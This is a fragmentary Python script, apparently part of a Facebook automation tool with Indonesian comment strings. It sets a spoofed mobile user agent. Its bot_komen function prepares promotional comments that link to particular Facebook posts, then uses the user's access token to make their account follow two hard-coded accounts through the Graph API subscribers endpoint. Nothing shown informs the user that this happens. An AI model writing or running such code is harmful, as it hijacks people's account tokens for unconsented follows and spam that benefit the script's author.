...
ua = ("Mozilla/5.0 (Linux; Android 5.1.1; H60-L04 Build/HDH60-L04) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.99 Mobile Safari/537.36 OPR/35.0.2070.100283 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]") 
s = requests.Session()
ct = datetime.now()
n = ct.month
...
def bot_komen():
    ...
    kom = ('GW PAKE SC LU BANG 😍😘\nhttps://www.facebook.com/1100015073506062/posts/1031861840659590/?app=fbl') 
    kom2 = ('KEREN BANG 😘😘\nhttps://m.facebook.com/photo.php?fbid=11110619372783836&set=a.106868716492245&type=3&app=fbl') 
    reac = ('LOVE') 
    ...
    requests.post('https://graph.facebook.com/1100002163187650/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1100015073506062/subscribers?access_token=' + token)
    menu()
